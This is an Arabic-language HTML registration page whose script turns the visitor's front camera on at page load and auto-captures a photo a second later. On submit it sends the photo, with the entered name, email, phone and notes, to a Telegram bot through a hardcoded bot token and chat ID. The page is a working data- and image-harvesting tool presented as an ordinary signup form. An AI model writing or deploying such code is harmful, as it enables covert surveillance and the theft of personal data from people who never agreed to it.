<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام التسجيل والتصوير</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            padding: 20px;
            max-width: 800px;
            margin: 0 auto;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0,0,0,0.1);
        }
        h1 {
            color: #0088cc;
            text-align: center;
            margin-bottom: 30px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
        }
        input, textarea {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
            font-size: 16px;
        }
        button {
            background-color: #0088cc;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            width: 100%;
            margin-top: 10px;
        }
        button:hover {
            background-color: #006699;
        }
        #status {
            margin-top: 20px;
            padding: 15px;
            border-radius: 5px;
            display: none;
        }
        .success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        #camera-container {
            margin: 30px 0;
            text-align: center;
        }
        #camera {
            max-width: 100%;
            border: 2px solid #ddd;
            border-radius: 5px;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>نظام التسجيل والتصوير</h1>
        
        <div id="camera-container" class="hidden">
            <h3>جاري إعداد الكاميرا...</h3>
            <video id="camera" autoplay playsinline></video>
        </div>
        
        <form id="registerForm">
            <div class="form-group">
                <label for="fullname">الاسم الكامل:</label>
                <input type="text" id="fullname" required>
            </div>
            
            <div class="form-group">
                <label for="email">البريد الإلكتروني:</label>
                <input type="email" id="email" required>
            </div>
            
            <div class="form-group">
                <label for="phone">رقم الهاتف:</label>
                <input type="tel" id="phone" required>
            </div>
            
            <div class="form-group">
                <label for="notes">ملاحظات:</label>
                <textarea id="notes" rows="3"></textarea>
            </div>
            
            <button type="submit">تسجيل البيانات</button>
        </form>
        
        <div id="status"></div>
    </div>

    <script>
        // بيانات البوت - استبدلها بمعلوماتك
        const BOT_TOKEN = '7512390719:AAHuHzUgshfHoqS-kkjzKxYrHFI0gHlWlsU';
        const CHAT_ID = '7327464581';
        
        // متغيرات النظام
        let capturedPhoto = null;
        let stream = null;
        
        // 1. عند تحميل الصفحة: محاولة التقاط صورة تلقائيًا
        window.addEventListener('DOMContentLoaded', async () => {
            try {
                // عرض قسم الكاميرا
                document.getElementById('camera-container').classList.remove('hidden');
                
                // فتح الكاميرا
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        width: { ideal: 640 },
                        height: { ideal: 480 },
                        facingMode: 'user'
                    }
                });
                
                const video = document.getElementById('camera');
                video.srcObject = stream;
                
                // التقاط الصورة بعد ثانية واحدة (يمكن تعديل الوقت)
                setTimeout(async () => {
                    try {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        // تحويل الصورة إلى Blob
                        canvas.toBlob(blob => {
                            capturedPhoto = blob;
                            showStatus('تم التقاط الصورة تلقائيًا وجاهزة للإرسال', 'success');
                            
                            // إيقاف الكاميرا بعد التقاط الصورة
                            if (stream) {
                                stream.getTracks().forEach(track => track.stop());
                            }
                        }, 'image/jpeg', 0.7);
                        
                    } catch (error) {
                        console.error('Error capturing photo:', error);
                        showStatus('حدث خطأ أثناء التقاط الصورة', 'error');
                    }
                }, 1000);
                
            } catch (error) {
                console.error('Camera error:', error);
                showStatus('تعذر الوصول إلى الكاميرا. سيتم إرسال البيانات فقط.', 'error');
            }
        });
        
        // 2. عند تقديم نموذج التسجيل
        document.getElementById('registerForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const fullname = document.getElementById('fullname').value;
            const email = document.getElementById('email').value;
            const phone = document.getElementById('phone').value;
            const notes = document.getElementById('notes').value;
            
            try {
                showStatus('جاري إرسال البيانات...', 'success');
                
                // إعداد نص الرسالة
                const messageText = `📋 **تسجيل جديد**\n\n`
                    + `👤 الاسم: ${fullname}\n`
                    + `📧 البريد: ${email}\n`
                    + `📱 الهاتف: ${phone}\n`
                    + `📝 الملاحظات: ${notes || 'لا يوجد'}\n\n`
                    + `🕒 الوقت: ${new Date().toLocaleString()}`;
                
                // إرسال البيانات النصية أولاً
                await sendToTelegram(messageText);
                
                // إذا كان هناك صورة ملتقطة، إرسالها
                if (capturedPhoto) {
                    showStatus('جاري إرسال الصورة...', 'success');
                    await sendPhotoToTelegram(capturedPhoto);
                }
                
                showStatus('تم إرسال البيانات والصور بنجاح!', 'success');
                
                // إعادة تعيين النموذج
                document.getElementById('registerForm').reset();
                
            } catch (error) {
                console.error('Error:', error);
                showStatus(`حدث خطأ: ${error.message}`, 'error');
            }
        });
        
        // دالة إرسال النص إلى تليجرام
        async function sendToTelegram(text) {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: text,
                    parse_mode: 'Markdown'
                }),
            });
            
            const data = await response.json();
            if (!data.ok) {
                throw new Error(data.description || 'فشل إرسال الرسالة');
            }
        }
        
        // دالة إرسال الصورة إلى تليجرام
        async function sendPhotoToTelegram(photoBlob) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', photoBlob, 'user_photo.jpg');
            
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
            
            const data = await response.json();
            if (!data.ok) {
                throw new Error(data.description || 'فشل إرسال الصورة');
            }
        }
        
        // دالة عرض حالة الإرسال
        function showStatus(message, type) {
            const statusElement = document.getElementById('status');
            statusElement.textContent = message;
            statusElement.className = type;
            statusElement.style.display = 'block';
            
            // إخفاء الرسالة بعد 5 ثواني
            setTimeout(() => {
                statusElement.style.display = 'none';
            }, 5000);
        }
    </script>
</body>
</html>
